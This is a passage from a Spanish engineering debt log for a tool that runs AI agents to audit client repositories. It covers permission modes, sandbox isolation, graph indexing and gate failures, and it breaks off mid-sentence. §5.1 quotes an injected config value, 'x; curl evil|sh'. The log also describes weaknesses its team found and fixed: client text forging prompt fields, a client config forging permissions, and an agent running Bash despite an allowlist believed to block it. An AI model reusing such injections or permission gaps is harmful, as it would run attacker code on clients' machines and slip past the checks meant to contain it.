# Deudas medidas

**Fecha:** 2026-09-30 · **Commit de referencia:** `15b7fbf`

Lo que se sabe que falta, con evidencia. **Nada entra aquí por intuición**: cada
entrada lleva `fichero:línea`, una fila de la base, o la corrida que lo destapó.

> ### POR DÓNDE SEGUIR (2026-09-29)
>
> **LA TRIFECTA DEL AISLAMIENTO ESTÁ CERRADA.** Los tres vectores por los que el
> CÓDIGO DEL CLIENTE rompía el aislamiento están arreglados y verificados en
> vivo: los **caracteres** de un texto suyo, que forjaban campos del prompt del
> generador (el saneador, `3810e5c`); el **corpus declarado** en su
> `.fortress/config`, que forjaba un bloque entero de permisos (`3c8a77d`); y su
> **`.git`**, que abría el HOME —y el repo de OTRO cliente— en escritura dentro
> de la caja (`10d3a68`). Los tres eran la misma clase de error: un dato del
> repo auditado tratado como fuente de verdad. La promesa «un cliente no toca a
> otro» ya no tiene excepción medida.
>
> **Y CON ÉL, LOS P0 DE SEGURIDAD DE LA AUDITORÍA ESTÁN CERRADOS.** El que
> quedaba en la lista —el analista y su área en texto libre— **no era un P0**: al
> medirlo, el embudo ya cerraba el vector, así que era P1 de calidad, y también
> está cerrado (`d3abb45`). Los cuatro urgentes siguen cerrados y verificados en
> vivo, y el gate volvió a ser determinista. Lo que queda, por lo que más pesa:
>
> **EL ARCO DEL MOTOR está abierto y su pieza 1 HECHA** (`15b7fbf`): el motor ya
> asienta la huella del trabajo de cada corrida del generador. Eso NO decide nada
> todavía — **mide hacia delante**, y los 20 casos pasados no se recuperan. La
> regla, cuando haya corridas nuevas: dos del MISMO hallazgo con la MISMA huella
> → giraba, subir el techo no compra nada; con huellas DISTINTAS → avanzaba.
>
> | # | Qué | Dónde |
> |---|---|---|
> | 0 | **Dejar correr al Motor** para juntar huellas y decidir su techo de vueltas | ROADMAP |
> | 1 | Los tramos 2 a 7 de la auditoría, sin empezar | §9.8 |
> | 2 | El residuo del primer urgente: informe PARCIALMENTE ilegible | §9.2 |
> | 3 | Las 5 filas viejas en `otro`: el 61 % de la señal del backlog sin reclasificar (lote aparte) | §9.2 |
> | 4 | Confirmar el determinismo con más superficie | §9.1 |
> | 5 | Los cuatro de los trece de la decisión D | §6.11 |
> | 6 | SECURITY-MODEL sin una palabra sobre la caja | §8.2 |
> | 7 | Los seis funcionales de la auditoría | §9.4 |
> | 8 | Las 35 erratas de documento | §9.5 |
>
> De los seis tramos que faltan, **`scripts/` es el que más pesa**: 106 ficheros
> sin un solo test, y corren sobre la base viva.
>
> **La lección de los cuatro urgentes, que vale para lo que queda:** ninguno se
> cerró con el arreglo que el informe proponía. En los cuatro la medición corrigió
> el hallazgo, y dos veces cambió qué se construía. El hallazgo dice dónde mirar,
> no qué construir.
>
> **AVISO OPERATIVO:** no drenar al abrir la app hasta decidir el bucle de gasto,
> o recomprar antes los cinco pausados.

> **Regla de este documento.** El tablero de la app acumula hallazgos vivos de
> TODOS los escaneos; la fila de `scans` dice cuántos vio ESE escaneo. Leer la
> pantalla y atribuirle el número a una fecha concreta mezcla semanas de trabajo.
> **La base es la verdad; la pantalla es una vista.** Ninguna cifra de aquí se
> escribió sin comprobarla primero.

---

## 1. Los cinco defectos del ensayo autónomo (2026-09-19)

Medidos tras el primer lote que el autónomo resolvió solo (3 de 3 procesados, 2
cerrados a Historia). **El orden de arreglo fue 1 → 5 y era innegociable**: el 1
es un agujero de garantía, el 2 la raíz de varios síntomas, y los demás dependen
de entenderlos.

> **Estado: 1-4 CERRADOS y construidos con gate 5/5. El 5 sigue ABIERTO** — y no
> por pereza: su causa **no está en el código medible**, está en un evento que
> hay que volver a provocar. Arreglarlo desde la base sería construir contra un
> fantasma.

### ~~(1) La aprobación de OMEGA no caduca~~ — **CERRADO** `1256620`

`olvidarAprobacion` (`src/infrastructure/aprobacion-del-plan.ts:32`) tiene **cero
llamadores de producción**. Su propio docblock promete _«El lote termino, o la
seleccion cambio: lo aprobado deja de estarlo»_, y nadie la llama.

**Consecuencia:** los ids aprobados seguían aprobados mientras viviera el
proceso. Un segundo lote con los mismos hallazgos **cruzaba la puerta del
ADR-097 §4 sin que OMEGA juzgara nada**. Fue primero por ser lo único de la
lista que debilitaba una garantía escrita.

**Arreglo:** caduca por dos vías, las dos solo-main. **(a)** un plan nuevo
invalida el permiso viejo antes de juzgarlo; **(b)** el permiso se **gasta** al
usarse, después de las dos puertas. Y el docblock de `olvidarAprobacion` dejó de
prometer una garantía por una vía imposible —los tres momentos que nombraba
viven en el renderer y esa función vive en el main, sin canal que los una—.

### ~~(2) El agente cree estar en supervisado~~ — **CERRADO** `3ff4186`

El turno de plan del lote manda `mode: 'supervisado'` a propósito, para que no
edite. Pero ese modo viaja hasta el prompt:

`lote-por-enter.ts` → `modo-del-turno.ts:28` → `send-message.ts:47,60` →
`reply-from-chat.ts:45` → **`chat-prompt.ts:33`** → `MODE_INSTRUCTION[mode]`

El agente recibe _«MODO SUPERVISADO: propon los cambios y espera aprobacion»_ y
obedece. Evidencia en la base, fila `chat_messages` de `2026-09-19T08:59:56Z`
(`mode='supervisado'`), texto literal del agente:

- _«…para aprobación directa (que es lo que pide el modo supervisado)»_
- _«Bloqueado por el modo supervisado (2):»_
- _«## Necesito cuatro decisiones tuyas»_

**Y un tercer síntoma, el más caro:** el mismo modo da
`permissionModeFor('supervisado') = 'plan'` (`permission-mode.ts:26`), y
`permission-mode.ts:4-8` ya documenta que **`plan` bloquea todas las llamadas
MCP**. El agente lo dijo: _«Grafo bloqueado en plan mode — sigo a mano»_. El turno
más caro del lote —**563 s, $5,02**— planeó sin grafo. El repo ya tiene la
solución (`'lectura'`, usada en `run-investigate.ts:21`); este camino no la usaba.

**Arreglo:** se anularon **solo las dos salidas malas** del `mode`. El turno de
plan corre en `'lectura'` —el grafo responde y el allowlist sigue sin `Write`,
`Edit` ni `Bash`— y recibe `INSTRUCCION_DEL_PLAN`, que no manda esperar a nadie.
El pie dejó de decir «supervisado» en un proyecto autónomo. **`mode:
'supervisado'` se quedó intacto**: es el portador legítimo de «no edita / no se
juzga», y tocarlo habría abierto un checkpoint vacío por turno de plan.

### ~~(3) La barra verde fija en autónomo~~ — **CERRADO** `2c9f168`

`pie-del-lote.ts:36` devuelve `'ejecutando'` **antes** de mirar el modo, así que
la píldora verde `Plan ejecutandose…` (`BotonDelPlan.tsx:8-11`, `bg-success`) sale
también en autónomo y dura todo el lote, porque cuelga de `enCurso` y no de la
fase. Las fases (Debate naranja / OMEGA azul) viven en otro componente,
`RunMeter.tsx`, y por eso aparecían en otro sitio de la pantalla.

**Arreglo:** en autónomo el pie es texto plano —`Lote 2 de 3 · Consultando a
OMEGA`—, con el lote como **ancla persistente** y la fase como **sufijo
opcional**: el medidor se apaga en el `finally` de cada envío, así que enseñar
solo la fase dejaría el pie en blanco entre turnos. El color va solo en el
sufijo. La barra de estado global no se tocó; supervisado tampoco.

### ~~(4) El grafo no se re-indexa tras editar~~ — **CERRADO** `2622946`

> **⚠ LA CAUSA QUE ESTE DOCUMENTO DABA ERA FALSA, y el arreglo que sugería
> habría CAUSADO el bug.** Decía: _«el lote edita y comitea, así que el sha se
> mueve»_, y proponía re-indexar tras cada turno. **El lote NO comitea**: el
> checkpoint es transitorio y `reset --soft` lo deshace
> (`checkpoint-transitorio.ts:38-45`). Re-indexar «tras editar» habría indexado
> justo el commit efímero — que es el bug.

**La causa real, medida el 2026-09-19:** el grafo se indexó **sobre un commit de
checkpoint** que luego se deshizo. `raisen-nucleo` quedó con
`indexado = 1752916` —un commit titulado literalmente «checkpoint transitorio»—
mientras HEAD seguía en `7e7eb7b`, del operador, del 1 de agosto. El índice no
se quedó atrás: **apuntaba a un sha borrado**, y por eso `currentSha !==
indexedSha` para siempre.

**Arreglo, dos piezas.** **(b)** `decideReindex` no indexa con un turno vivo —la
señal se **deriva** del carril (`turnoVivo: isRunning`), que ya tiene su
`endRun` en cada `finally`, en vez de inventar un registro que habría que soltar
a mano—. **(a)** el lote reconcilia **al cerrar**, con el árbol ya quieto.

Y quedó fijado por test que un índice apuntando a un sha inexistente **se
repara**: `decideReindex` compara igualdad, no ascendencia.

### (5) Dos fallos sin causa en el código — **ABIERTO, esperando reproducción**

**No es arreglable desde la base**, y por eso no se fuerza: su causa está en un
evento que hay que volver a provocar, no en una línea que se pueda leer.
Construir sobre lo que no se ha visto es exactamente lo que ADR-097 evitó al
borrar el «¿y si OMEGA se cae?» que nadie había medido.

#### PARTE A — el hallazgo 2 se saltó el debate. **Es un BUG, no diseño**

Hallazgo `3c160747` (migración SQL, MEDIUM). **Su ventana entera fue el
productor solo**, y se probó por aritmética, no por ausencia de filas:

|        | ventana   | corridas                               | suma      |
| ------ | --------- | -------------------------------------- | --------- |
| H1     | 848 s     | productor 367 + crítico 414 + OMEGA 63 | 844 s     |
| **H2** | **473 s** | **productor 471**                      | **471 s** |
| H3     | 676 s     | productor 273 + crítico 323 + OMEGA 79 | 675 s     |

**NO lo cortó el gate.** Los **tres** turnos llevan `CONSERVADO_SIN_VERIFICAR`,
que solo se emite con `arbol === 'desconocida'` (`turno-protegido.ts:42`). Y
`desconocida` **no corta** (`verificacion-del-arbol.ts:31`) y **sí permite
tribunal** (`tribunal-del-turno.ts:32`). H1 y H3 debatieron bajo el mismo estado.

**Mismas condiciones, comportamiento distinto: bug.**

**Lo que NO se pudo cerrar.** De las tres salidas de `arbitrar:60`
(`rojo || !edito || juez === null`): `rojo` descartado —el aviso lo prueba—,
`edito` descartado —`edits=3`—. **Queda `juez === null` sin explicar**, y la base
no muestra qué guarda disparó. **No se inventa: necesita reproducción con logs.**

#### PARTE B — una corrida murió sin dejar NADA

Ventana `09:42:49Z → 10:25Z`: **0 `agent_runs`, 0 `chat_messages`**. El Motor
escribió a las 10:25, así que la base estaba viva: **el silencio es de esa
corrida**.

Y el dato que decide el arreglo: **no dejó ni el mensaje de usuario**, que
`send-message.ts:54` persiste **antes** del turno. Murió antes de llegar ahí, o
murió el proceso principal entero.

> **Por eso el vocabulario tipado del Motor NO cubre este caso.** El `noArranco`
> del Motor deja fila porque el proceso **llega a registrar**. Aquí nada llegó a
> escribirse, y **no se puede tipar un fallo que ocurre antes del punto donde se
> escribe**. Son fallos distintos, y el de aquí necesita instrumentación que hoy
> no existe.

#### PLAN — una sola reproducción sirve para las dos

Una corrida del lote con la app abierta, mirando **los logs de consola además de
la base**. Si H2 vuelve a saltarse el debate, los logs dirán qué guarda saltó
(A). Si algo se cae, veremos si deja fila y dónde muere (B).

---

## 2. El contador del escaneo miente

`scans.finding_count = 27` para el escaneo `e7212154` (2026-09-18), contra **23
filas reales** en `findings` con ese `scan_id`. Desfase de 4, a favor del
contador. Lo destapó la auditoría de este documento.

Importa más de lo que parece: ese contador es lo que se lee para decir cuánto
encontró un escaneo, y es la cifra que acaba en un parte o en un informe.

---

## 3. El debate ve el grafo PRE-LOTE

Salió al medir el bug 4, y **no se arregló a propósito**: cambia el contrato del
indexador y merece su propio arco con ADR.

El lote **no comitea** —el checkpoint es transitorio—, y el índice del grafo es
**de commits**. Así que el crítico del turno N navega el código **anterior al fix
del turno N-1**, siempre, y ninguna re-indexación lo arregla: esas ediciones no
están en ningún commit que indexar.

**Cuándo muerde:** dos hallazgos del mismo módulo que se pisan entre turnos. En
el ensayo dio igual —tres ficheros sin relación—.

**Cubierto parcialmente:** el gate del turno N y su propio `cp.diff()` cazan un
fix malo aunque el mapa esté viejo. Lo que se pierde es **contexto**, no la red.

**Lo que haría falta:** indexar el árbol de trabajo en vez del HEAD. Es otro
modelo del grafo — su propio arco, no este bug.

---

## 4. La premisa falsa de `--allowedTools` — ¿qué más se apoya en ella?

Medido el 2026-09-20, dos corridas, $0.60:

|                                              |                                                                                            |
| -------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `--allowedTools Read` + prompt que pide Bash | **Bash se ejecutó**, `permission_denials` **vacío**                                        |
| el mismo, con `--disallowedTools Bash`       | **«NO_PUDE_BASH»**, y `permission_denials` **también vacío** — la herramienta no se ofrece |
| `Write` sin listar                           | **denegado**, con fila en `permission_denials`, y el fichero no existe en disco            |

**`--allowedTools` PRE-APRUEBA. No deniega.** El docblock de
`build-allowed-tools.ts:11-12` afirmaba _«escribir/Bash quedan denegados por no
estar en la lista»_ — **falso en la mitad de Bash**, y lo creyó todo el que lo
leyó. Ya está corregido allí.

**La deuda que queda es la pregunta grande:** ese docblock era la fuente de
verdad sobre qué bloquea el allowlist. **¿Qué otras garantías del repo se apoyan
en esa premisa?** Un sitio que omita una herramienta de `--allowedTools` creyendo
que la bloquea, no la bloquea.

**Sin revisar todavía.** El barrido es `grep` de `allowedTools` y de cada
docblock que diga «denegado», «bloqueado» o «no puede» sobre una herramienta.

> **La lección, y vale más que el arreglo:** el gate estaba verde, el test estaba
> verde, y la garantía era falsa. Solo la corrida lo distingue. Un docblock que
> afirma una garantía de seguridad **sin que nadie la haya falsado** es una
> premisa heredada, y se hereda hacia abajo: lo repitió el código, lo repitió un
> test, y lo repitió quien escribió la pieza de encima.

---

## 5. Conectado el Terminal al registro de observaciones (2026-09-20)

> Es el **(2) del segundo ensayo** —«conectar el Terminal al JSON de
> observaciones»—, no el bug 2 de §1. Aquel era el modo de permisos.

**Primer órgano del sistema nervioso conectado.** El Terminal ya escribía
observaciones derivadas de `permission_denials` (`finish-turn.ts:51`); ahora
escribe también lo que descubre **reparable en el proyecto del cliente**.

Un **pre-vuelo determinista** lee el `.claude/settings.json` del proyecto antes
de correr el turno, saca sus hooks `PreToolUse` y comprueba que el intérprete
existe. Si un hook declarado **no puede arrancar**, eso es una barrera rota: el
proyecto cree estar protegido y no lo está.

| pieza                  | fichero                                          |
| ---------------------- | ------------------------------------------------ |
| lectura del dato       | `domain/project/hook-del-proyecto.ts`            |
| detección              | `domain/project/barrera-rota.ts`                 |
| derivación de la obs   | `domain/project/observacion-de-barrera.ts`       |
| área nueva             | `domain/system/areas-del-terminal.ts`            |
| `command -v` sin shell | `infrastructure/project/interprete-existe.ts`    |
| pre-vuelo              | `infrastructure/project/barreras-del-proyecto.ts`|
| fail-closed            | `infrastructure/barrera-guard.ts`                |

- **`kind: 'bug'`, `area: 'barrera-del-proyecto'`** (vocabulario cerrado, tercera
  familia). Con área propia, dos clientes con la barrera rota suman avistamientos
  juntos y `vistaEn: 2` da la señal; en `otro` se habría fundido con el cajón.
- **Fail-closed en autónomo**: el lote NO corre sin la protección. En supervisado
  no bloquea —hay humano— pero la observación se asienta **igual**.
- **Del DATO, no de `stderr`.** La config del proyecto es estructura versionada
  por un esquema; el aviso del CLI es texto inglés que cambia sin avisar.

### 5.1 Cinco fallos cazados durante la construcción — arreglados, con su lección

Ninguno es deuda abierta. Están aquí porque **la lección vale más que el arreglo**.
Los cinco son patrones que esta sesión ya conocía, reapareciendo en la pieza nueva.

**1. `command -v` con shell era ejecución arbitraria desde la config del cliente.**
El comando sale del `settings.json` de un repo AUDITADO. Con `sh -c "command -v $x"`,
un `"command": "x; curl evil|sh"` se habría ejecutado por el simple hecho de
**abrir el proyecto**. Arreglado recorriendo el `PATH` con `access(X_OK)`, sin
intérprete, más 3 tests de inyección que fallan si alguien devuelve una shell.

> **LECCIÓN: una defensa que verifica dato del cliente no puede ser ella misma
> una vía de ejecución.** El pre-vuelo que detecta barreras rotas no puede ser
> una barrera rota.

**2. Una pared redundante, delatada al romperla.** Tenía
`if (settings === null) return []` en el pre-vuelo. Al romperla **no cayó ningún
test**: el dominio ya devuelve lista vacía ante `null`, basura o un `hooks` que no
es objeto. Era la garantía duplicada encima de donde ya vive. Quitada.

> **LECCIÓN: una comprobación que al romperla no rompe ningún test, no hace nada.**
> Romper paredes no solo confirma las reales — **delata las pintadas**.

**3. Un test de determinismo que pasaba por SUERTE.** Comparaba dos llamadas
seguidas, y `Date.now()` devuelve lo mismo dentro del mismo milisegundo: con la
nota bailando, el test seguía verde. Corregido para **cruzar el milisegundo**, más
un segundo test que cuenta **filas** de `observation_sightings` —`vistaEn` no se
movía porque cuenta proyectos, no avistamientos—.

> **LECCIÓN: un test que pasa por coincidencia temporal da falsa confianza, y eso
> es peor que fallar.** Mismo patrón que el `not.toMatch` que casaba el docblock
> en vez del código.

**4. El fail-closed podía desarmarse a sí mismo.** `innegociables-derivados`
deriva sola la puerta —`guardBarrera` casa con `guard\w+`— pero **no el
pre-vuelo**: `barrerasDelProyecto` no exporta ninguna guarda. Un fix que lo
hiciera devolver lista vacía apagaría el fail-closed **entero sin tocar la
puerta**, y habría entrado por auto-merge sin que nadie lo viera. Blindado con un
test que exige las **dos mitades** en la lista innegociable.

> **LECCIÓN: es `innegociables-derivados` otra vez** —el auto-merge borrando su
> propia puerta—. **Cada mitad de una defensa nueva tiene que estar protegida, no
> solo la visible.**

**5. Un byte NUL real dentro de un `.ts`, que pasó el gate entero.** El escape
`\0` de un test se escribió como **byte**, no como texto. Git marcó el
fichero como binario (`Bin 0 -> 2445 bytes`): habría entrado a `main` **sin diff
legible**. Y el fichero era justo `interprete-existe.test.ts` — el que prueba que
el `command -v` no abre una shell. Arreglado con `String.fromCharCode(0)`, que
deja el fuente en ASCII puro y prueba exactamente lo mismo.

**Lo delató `git diff --stat`, no el gate.** Typecheck, lint y los 3804 tests
pasaron con el NUL dentro, porque **el código funcionaba**.

> **LECCIÓN: el gate verifica el comportamiento, no la forma en el repo.** Cinco
> pasos verdes no garantizan que el código sea legible, auditable ni revisable.
> Un test de seguridad crítico habría llegado a `main` como binario opaco: nadie
> —ni el próximo agente, ni una revisión humana— podría leer qué prueba, y un
> fallo dentro pasaría desapercibido **para siempre**, porque el diff no se puede
> leer. Es la pared pintada llevada al extremo: no una garantía falsa, sino una
> garantía **ilegible**. `git diff --stat` antes de commitear no es un trámite:
> es lo único que caza un fichero que funciona y es opaco.

> ⚠ **DEUDA ABIERTA, y es la única de las cinco sin pared** → **§6.1**. Las otras
> cuatro quedaron defendidas por un test; esta, por ahora, depende de recordar
> mirar. La defensa derivada no se construyó aquí a propósito: va después del
> ensayo.

#### El patrón que une a los cinco

| # | fallo                          | patrón                          |
| - | ------------------------------ | ------------------------------- |
| 1 | `command -v` con shell         | la defensa que abre otro agujero |
| 2 | el `null` duplicado            | la pared redundante             |
| 3 | el test del reloj              | el test que pasa por suerte     |
| 4 | el pre-vuelo sin proteger      | la defensa que se auto-desarma  |
| 5 | el byte NUL                    | el verde ilegible               |

> **VERDE NO BASTA.** El test que pasa por coincidencia del reloj, el
> `not.toMatch` que casaba el docblock, el docblock que mentía sobre seguridad y
> el fichero binario que pasa el gate son **lo mismo**: verde que no significa lo
> que parece. La disciplina no es «que el gate pase»; es **«que el gate pase Y
> que puedas ver por qué»**. El NUL rompe la segunda mitad sin tocar la primera.

### 5.2 Las otras venas del Terminal — arco siguiente, NO abierto

Quedan dos observaciones del backlog esperando la suya, y **no se abrieron a
propósito**:

| obs  | qué dice                | qué le falta                        |
| ---- | ----------------------- | ----------------------------------- |
| [16] | «no puedo instalar»     | un dato estructurado del que salir  |
| [17] | «herramienta fantasma»  | idem — `check_index_coverage` está en `GRAPH_READ_TOOLS` y el servidor no lo expone |

**La regla que este arco dejó escrita, y que decide cómo se abren:**

1. Si tienen **dato estructurado** (un `rc`, un `permission_denial`, una entrada
   de config), se derivan de ahí, como la barrera rota salió del
   `.claude/settings.json`. Eso es barato y no se rompe solo.
2. Si **solo viven en `stderr`**, es otro arco. `run-accumulator.ts:62` tira el
   stderr cuando el turno tiene éxito, y conservarlo habilitaría las dos — pero
   el `stderr` del CLI es **texto inglés sin versionar**: el día que Anthropic
   cambie la frase, la derivación deja de encontrar nada **y no falla, calla**.
   Ese arco tiene que traer su propia decisión de «cómo no romperse en silencio»,
   y sin ella no se abre.

> **Por qué esto es una deuda y no una tarea.** La opción fácil —parsear
> `stderr`— estaba disponible y se descartó midiendo, no por gusto. Escribirlo
> aquí es lo que impide que dentro de un mes alguien la tome por ser la corta.

### 5.3 Lo que el pre-vuelo NO cubre (dicho, no escondido)

- **OBSOLETO el 2026-09-26** (ADR-105, merge `4dbaa1b`): se decidió y se
  construyó. ~~Un turno **suelto** en autónomo también edita, y `guardBarrera`
  lo deja pasar: lo que se decidió bloquear fue el **lote**. Quitar
  `ejecutaUnLote` es una línea y la costura está puesta; no se amplía sin
  decidirlo.~~ Hoy la guarda es `guardBarrera(context, projectId, edita)`: el
  chat pasa `editaElChat` (autónomo en la base y turno por el CLI, sin mirar el
  input, así que suelto, lote y workflow son iguales) y el Ejecutor de Construir
  pasa `true` (negado sea cual sea el modo, recibo en el historial).
  `ejecutaUnLote` ya no participa en la guarda.
- Solo mira `PreToolUse`. Un `PostToolUse` roto pierde un aviso; un `PreToolUse`
  roto deja pasar la escritura que venía a impedir. Esa es la línea, y es la
  correcta mientras lo que se protege sea lo irreversible.

### 5.4 Corrección de un hecho que constaba como aplicado

El arreglo de `raisen-nucleo/.claude/settings.json` —`python`→`python3` en los
dos hooks, los seis `deny` extendidos a `Edit`/`MultiEdit`, backup
`.bak-pre-fix-hooks-2026-09-20`— **figuraba como hecho y verificado. No lo está.**
Medido el 2026-09-20: el fichero sigue con `python`, `command -v python` está
vacío, no existe ningún `.bak` en la máquina y los `deny` siguen cubriendo solo
`Write(...)`. La barrera lleva muerta desde julio.

> Es la misma clase de defecto que §4: **una protección dada por buena sin que
> nadie la comprobara.** Que sea justo lo que este arco vino a detectar no es
> casualidad; es la razón de que exista.

---

### 5.5 Sangrado medido: jueces huérfanos de la suite de integración (2026-08-26 → 2026-09-24)

Destapado el 2026-09-24 al confirmar la huella de la caché del grafo tras
mergear la pieza B del arco #4. El check «Loop blindado» de la suite de
integración enciende un loop real sobre el repo propio (`projects.self()`) y
revoca la confianza unas líneas después. Entre medias el motor ya iba hacia el
escaneo: el juez del alcance (`claude -p "Clasificas el ALCANCE…"`) nacía sobre
el repo, y la parada se perdía por una carrera —`tryBeginRun` borra la marca de
cancelado, o el hijo nace después de que `killChildrenOf` matara a los vivos—.
La app salía sin matar hijos: el juez quedaba huérfano (reparentado a systemd),
70 ms o hasta dos minutos según la carrera, con un `codebase-memory-mcp` colgado
de él vigilando el repo y reindexándolo al ver cambios (14:11:20Z del 24-sep).

**Medido, no estimado**: los logs MCP del CLI con cwd en el repo
(`~/.cache/claude-cli-nodejs/…/mcp-logs-codebase-memory/`) suman **275
conexiones desde el 26 de agosto**; 170 viven entre 60 y 180 s, la forma del
juez (88 a 124 s medidos), en 171 sesiones distintas; 89 viven más de 180 s
(turnos legítimos) y 16 menos de un minuto. Ocho el 24-sep solo. Cada una es un
`claude -p` real sobre el repo, en el plan del operador, sin que nadie lo
pidiera. Las sondas `claude --version` y `claude auth status` quedan
descartadas: no abren MCP (probado desde cwd vacío y desde el repo).

**Cerrado en `main`** (merge `f836f14`, 3 commits, 3 mutantes muertos, gate 6/6
con las tres pruebas): `loopScan` honra la parada ANTES de reservar el carril
(`loopParado`, que pregunta solo «lo pararon»); el agente mata al hijo al
registrarlo si su proyecto ya está cancelado; y `will-quit` pasa por `alSalir`,
que mata a todos los hijos antes de cerrar la base. Lección, la de §4 y §5.4:
un test que enciende algo real tiene que apagarlo, y la app no puede fiarse de
que sus hijos mueran con ella.

---

### 5.6 `has_graph`, la contabilidad del grafo que mentía: medido y cerrado (2026-09-24)

Medido sobre la base viva en solo lectura: `has_graph` estaba en **0 en siete
de ocho proyectos**, seis de ellos con índice en disco y `graph_indexed_at_sha`
puesto, y en **1 en el único sin índice** (mailbd, cuyo `.db` desapareció cuando
la caché entera renació el 2026-08-29 sin que conste quién la borró). La causa no
era el slug ni el store mixto: **dos escritores para una verdad y ningún
lector**. El 1 lo ponía solo `installGraph` (el botón de instalar) por
`setGraph`; el reconcilio por sha, que es como se indexaron los seis, escribía
`graph_indexed_at_sha` por `markSuccess` y nunca tocaba la bandera; y la decisión
comparaba shas sin mirar si el `.db` existía, así que mailbd salió «alineado con
HEAD» en cada arranque durante un mes.

**Cerrado en `main`** (merge `686b212`, 9 mutantes muertos): `decideReindex`
recibe `indiceEnDisco` y un índice ausente se reindexa aunque el sha coincida;
`clearGraph` es el inverso de `setGraph`; el reconcilio alinea la bandera con el
disco antes de decidir y el éxito del runner exige el `.db`. Verificado con el
código real sobre una copia de la viva: seis proyectos 0→1 con sus nodos, mailbd
1→1 (indexado en la máquina con el binario fijado: 1232 nodos), Trade99PRO 0→0
(sin repo git, §6). En la viva cambia al primer arranque con el binario
reconstruido.

---

## 6. Deudas estructurales

| deuda                                 | evidencia                                                                   | qué la desbloquea                                                                                                                                    |
| ------------------------------------- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| ~~**ADR-092 (el sandbox) sin escribir**~~ — **CERRADO** `cd6a510` | firmado `3af7007`, construido en 24 commits y en `main` el 2026-09-21: `npm ci` por el proxy medido en vivo | lo que deja abierto, en §6.2 |
| **Verificación de stacks no-Node**    | el gate corre `npm`; un repo Python o Go no se verifica                     | ADR-092 + Bash libre. **No** un gate por lenguaje: sería mantener N gates                                                                            |
| **`sendMessage` saturado**            | 11 parámetros posicionales (`send-message.ts:23-36`)                        | rozada tres veces sin tocarla; se parte por costura cuando un arco la despierte de verdad                                                            |
| **`build-prompt.ts:6`**               | `'- NUNCA toques auth, pagos, RLS ni seguridad sin dejarlo escrito antes.'` | **medir primero**: dice «sin dejarlo escrito antes», no «vuelve a supervisado». Puede ser transparencia legítima o el freno de ADR-089 con otra ropa |
| **Ningún paso del gate mira la FORMA del fuente** | el NUL de §5.1-5: `interprete-existe.test.ts` pasó typecheck, lint y 3804 tests, y Git lo marcó `Bin 0 -> 2445 bytes` | una defensa derivada (~15 líneas en `src/domain/repair/`) que rechace todo `.ts` de `src/` con bytes de control |
| **El índice de ADRs va por detrás** | `docs/DECISIONS/README.md` no tiene fila para ADR-091 a 098, y el 094 no existe (visto el 2026-09-22 al añadir ADR-099) | añadir las ocho filas. Deuda de documentación, no de este arco (ADR-099 §3, firmado) |
| **El score del escaneo cuenta los descartados** | `expediente-del-cierre.ts:29-31` puntúa `datos.reportados` (sin `status`) más los ACTIVE ausentes (`ausencia.ts:24`, sin mirar `status`); el quality audit sí filtra (`run-quality-audit.ts:24`, `isOpen`) y el push también (`record-push-decision.ts:28`). Medido el 2026-09-23, §6.3 | filtrar los descartados en `calcularExpediente` con el mismo `isOpen`, y un test que descarte un CRITICAL reportado y compruebe que el score del cierre no baja |
| **Patrón repetido en N ficheros sin modelar** | la observación de Trade99PRO del 2026-09-12 (`contrato-del-hallazgo`, pendiente): «ni un hallazgo de patrón repetido en N archivos; hubo que partirlo en entradas sueltas y dejar funciones de menor impacto en prosa». El contrato exige fichero y línea concretos por hallazgo, así que un defecto idéntico en N funciones son N filas o prosa. Medido el 2026-09-23 al medir las cadenas, §6.4 | pieza propia: un hallazgo «de patrón» con sus N sitios, cuando una segunda observación lo pida |
| **Patrón A: la línea que ya no es (deriva de línea)** | 6 de 40 vivas de FORTRESS con el ancla en un comentario de un fichero que cambió tras `first_seen`; 0 en clientes (repos estáticos); 0 duplicados por línea tras el lote del alias. Medido el 2026-09-23, §6.5 | medir la deriva de línea en el próximo escaneo de FORTRESS con `medir:deriva`; si la palanca 1 no la mata, el lote del alias automático tras cada escaneo |
| **El store del grafo lleva 4 tablas de la 0.11.0** | la sesión de Claude Code del operador arrancaba el grafo con `npx -y codebase-memory-mcp` sin versión (`~/.claude.json`) y un daemon 0.11.0 escribió en la caché real `index_coverage`, `index_coverage_meta`, `lsp_surface` y `store_meta` (medido el 2026-09-24); la 0.9.0 fijada las ignora, mismas columnas en `nodes`, `edges`, `file_hashes` y `projects`. El 2026-09-24 la sesión quedó fijada al binario del PATH (0.9.0), el daemon parado y las cachés de npx borradas; huella de los 7 SQLite y del binario idéntica antes y después | inofensivas; si algún día se sube a 0.11.0 (arco futuro), ya están. No borrarlas a mano |
| **Handlers inline sin descomponer en el grafo** | `serve(async (req) => …)` de Deno y `http.createServer((req, res) => …)` dan UN solo nodo: el cuerpo del handler no tiene símbolos (ensayo-fail-closed: 62 nodos y 1 Function; mailbd: 6 observaciones sobre las edge functions). Hueco de GRANULARIDAD, no de cobertura; igual en 0.9.0 y 0.11.0. Medido el 2026-09-24, ADR-104 §4 | medir cuánto pesa (hallazgos vivos en handlers inline y cuántas lecturas cuesta) antes de tocarlo; firmado en ADR-104 casilla 5: no va al prompt |
| Trade99PRO sin índice del grafo | Está en disco (`~/Escritorio/Trade99PRO`, 27 275 ficheros) pero NO es un repositorio git y no es de confianza: el reconcilio salta con «sin repo git» y el botón de instalar exige confianza, así que sus 19 vivas quedan invisibles al grafo (medido 2026-09-24, pieza B del arco #4). | Un `git init` del operador en ese proyecto, o un runner que indexe sin exigir sha (el binario no necesita git). |
| **La columna «dónde se arregla» (ADR-102 §1.5)** | el analista ya declara `arreglo` (fichero y línea) y el guard lo contrasta con la correa; no se persiste como columna propia ni se pinta en la fila: hoy solo vive dentro del JSON del análisis de la propuesta (medido 2026-09-23). | Un consumidor que la lea —la fila del hallazgo o el selector—; hasta entonces es infraestructura por adelantado, como el corte 2 y el defecto a propósito (§6.3). |

### 6.1 La defensa que falta: ficheros fuente opacos

**Medido el 2026-09-20.** Un fuente con un byte de control —un NUL— **pasa los
cinco pasos del gate** y llega a `main` como binario, **sin diff legible**. El
gate verifica que el código funciona; **no verifica cómo se ve en el repo**.

Lo cazó `git diff --stat`, no el gate.

> **LECCIÓN: `git diff --stat` antes de commitear es parte de la disciplina**, no
> un trámite. Es lo único que caza un fichero que funciona y es opaco.

**Por qué es deuda y no está cerrada:** las otras cuatro lecciones de §5.1 tienen
**pared** —tests de inyección, el break que delató la redundancia, el cruce del
milisegundo, el test de las dos mitades—. **Esta depende de que alguien se acuerde
